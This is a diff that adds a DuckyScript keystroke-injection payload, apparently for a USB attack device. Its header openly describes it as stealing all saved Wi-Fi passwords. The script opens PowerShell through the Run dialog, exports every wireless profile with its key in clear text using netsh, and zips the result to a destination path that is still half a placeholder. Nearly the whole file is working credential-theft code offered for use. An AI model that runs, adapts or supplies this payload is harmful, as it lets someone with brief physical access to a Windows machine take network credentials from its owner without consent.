@@ -1,0 +1,31 @@
+REM Author: g0dm0de1337 Unl0ck-m0de 
+
+REM Description: Steals all of the saved Wifi Passwords and stores them into a USB device of your choice. 
+
+REM Version: 1.0 
+
+REM Category: Passwords 
+
+DELAY 1000 
+
+WINDOWS r 
+
+DELAY 900 
+
+STRING powershell  
+
+ENTER 
+
+DELAY 7000 
+
+STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss');$userDir = (Get-ChildItem env:\userprofile).value + '\Walkuer Ghost Report ' + $folderDateTime;$fileSaveDir = New-Item  ($userDir) -ItemType Directory;$date = get-date;netsh wlan export profile key=clear folder=$fileSaveDir;Compress-Archive -Path $fileSaveDir -DestinationPath **hierkommtdeinpfadreinQ:\HackWiFi\passwort\*$((Get-Date).ToString('dd.MM.yyyy-HH-mm-ss')).zip   
+
+DELAY 2000 
+
+ENTER 
+
+DELAY 5500 
+
+STRING exit 
+
+ENTER
